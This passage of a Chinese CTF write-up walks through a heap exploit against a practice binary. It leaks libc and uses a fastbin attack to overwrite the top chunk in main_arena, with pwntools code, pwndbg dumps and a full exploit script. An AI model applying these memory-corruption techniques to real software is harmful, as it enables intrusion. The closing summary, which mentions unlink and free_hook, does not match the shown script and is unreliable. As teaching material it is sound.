        p.sendlineafter('please chooice :\n','3')
        p.sendlineafter('which node do you want to show\n',str(ind))
上述为框架函数
    new(0x80)
    new(1)
    free(0)
    new(0x80)
    show(0)
    p.recvuntil('the content is : \n')
    leak = u64(p.recvuntil('\n')[:-1].ljust(8,"\x00"))
    print hex(leak)
    base = leak-3951480
    //效果如下(下方的格式都是先是代码和执行完的调试结果)
    pwndbg> heap
    0xde8000 PREV_INUSE {
      prev_size = 0, 
      size = 145, 
      fd = 0x7f06f2f30b78 , 
      bk = 0x7f06f2f30b78 , 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    0xde8090 FASTBIN {
      prev_size = 144, 
      size = 33, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x20f51
    }
    0xde80b0 PREV_INUSE {
      prev_size = 0, 
      size = 134993, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    pwndbg> x/32gx 0xde8000
    0xde8000:   0x0000000000000000  0x0000000000000091
    0xde8010:   0x00007f06f2f30b78  0x00007f06f2f30b78
    0xde8020:   0x0000000000000000  0x0000000000000000
    0xde8030:   0x0000000000000000  0x0000000000000000
上述为泄漏 libc 地址
    new(0x40)
    free(2)
    edit(1,p64(0)*3+p64(0x51)+p64(0x61))
    pwndbg> x/32gx 0xde8000
    0xde8000:   0x0000000000000000  0x0000000000000091
    0xde8010:   0x00007f06f2f30b78  0x00007f06f2f30b78
    0xde8020:   0x0000000000000000  0x0000000000000000
    0xde8030:   0x0000000000000000  0x0000000000000000
    0xde8040:   0x0000000000000000  0x0000000000000000
    0xde8050:   0x0000000000000000  0x0000000000000000
    0xde8060:   0x0000000000000000  0x0000000000000000
    0xde8070:   0x0000000000000000  0x0000000000000000
    0xde8080:   0x0000000000000000  0x0000000000000000
    0xde8090:   0x0000000000000090  0x0000000000000021
    0xde80a0:   0x0000000000000000  0x0000000000000000
    0xde80b0:   0x0000000000000000  0x0000000000000051
    0xde80c0:   0x0000000000000061  0x0000000000000000
    0xde80d0:   0x0000000000000000  0x0000000000000000
    0xde80e0:   0x0000000000000000  0x0000000000000000
    0xde80f0:   0x0000000000000000  0x0000000000000000
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0xde80b0 ◂— 0x61 /* 'a' */
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
这个就是为了之后的 malloc 出来 fastbin 做铺垫,`0x61`等会作用很大
    new(0x40)
    new(0x50)
    free(3)
    edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x61
    0x60: 0xde8100 —▸ 0x7f06f2f30b38 (main_arena+24) ◂— 0xde8100
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    pwndbg> x/32gx 0x7f06f2f30b38
    0x7f06f2f30b38 : 0x0000000000000000  0x0000000000000061
    0x7f06f2f30b48 : 0x0000000000de8100  0x0000000000000000
    0x7f06f2f30b58 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b68 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b78 : 0x0000000000de8160  0x0000000000000000
    ...
可以看到上边的结果, 0x61 已经写进去了,而且 0x60 的块也构造好了,满足构造条件,下边就是合理使用了
    new(0x50)
    new(0x50)
    edit(4,p64(0)*6+p64(leak-0x78))
    pwndbg> x/20gx 0x7f06f2f30b00
    0x7f06f2f30b00 :   0x00007f06f2bf1e20  0x00007f06f2bf1a00
    0x7f06f2f30b10 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b20 :    0x0000000000000000  0x0000000000000000
    0x7f06f2f30b30 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b40 : 0x0000000000000061  0x0000000000000000
    0x7f06f2f30b50 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b60 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b70 : 0x0000000000000000  0x00007f06f2f30b00  ------>topchunk
    0x7f06f2f30b80 : 0x0000000000000000  0x00007f06f2f30b78
    0x7f06f2f30b90 :    0x00007f06f2f30b78  0x00007f06f2f30b88
    pwndbg> arena
    {
      mutex = 0, 
      flags = 0, 
      fastbinsY = {0x0, 0x0, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
      top = 0x7f06f2f30b00 ,
通过上述,可以看到已经把 top_chunk 给改了,这里要注意一下 topchunk千万别是 0 ,注意一下偏移就好了
    new(1)
    edit(5,'a'*8)
    pwndbg> x/20gx 0x7f06f2f30b00-0x10
    0x7f06f2f30af0 :   0x00007f06f2f2f260  0x0000000000000000
    0x7f06f2f30b00 :   0x00007f06f2bf1e20  0x0000000000000021
    0x7f06f2f30b10 : 0x6161616161616161  0x0000000000000000
    0x7f06f2f30b20 :    0x0000000000000000  0x00007f06f2bf19e1
    0x7f06f2f30b30 : 0x0000000000000000  0x0000000000000000
    0x7f06f2f30b40 : 0x0000000000000061  0x0000000000000000
利用成功,完整 exp 见下
    from pwn import *
    p = process('./supwn5',aslr=2)
    elf = ELF("./supwn5", checksec=False)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    #context.log_level = "debug"
    def new(size):
        p.sendlineafter('please chooice :\n','1')
        p.sendlineafter('please input the size : \n',str(size))
    def free(ind):
        p.sendlineafter('please chooice :\n','2')
        p.sendlineafter('which node do you want to delete\n',str(ind))
    def edit(ind,content):
        p.sendlineafter('please chooice :\n','4')
        p.sendlineafter('which one do you want modify :\n',str(ind))
        p.sendafter('please input the content',content)
    def show(ind):
        p.sendlineafter('please chooice :\n','3')
        p.sendlineafter('which node do you want to show\n',str(ind))
    new(0x80)
    new(1)
    free(0)
    new(0x80)
    show(0)
    p.recvuntil('the content is : \n')
    leak = u64(p.recvuntil('\n')[:-1].ljust(8,"\x00"))
    print hex(leak)
    base = leak-3951480
    new(0x40)
    free(2)
    edit(1,p64(0)*3+p64(0x51)+p64(0x61))
    new(0x40)
    new(0x50)
    free(3)
    edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))
    new(0x50)
    new(0x50)
    edit(4,p64(0)*6+p64(leak-0x78))
    new(1)
    edit(5,'a'*8)
    gdb.attach(p)
    p.interactive()
## 总结
通过这个可以看到 fastbin-->malloc_hook 还是比较简单的,但是构造起来很需要耐心.另外可以发现我这个 unlink
exp偷懒了,完全可以很稳的执行 system('/bin/sh') 的,但还是因为想偷懒,直接向 free_hook 填的 one_gadget
,不过还好成功了.所以其实还是得少用 one_gadget ,这个还是下下策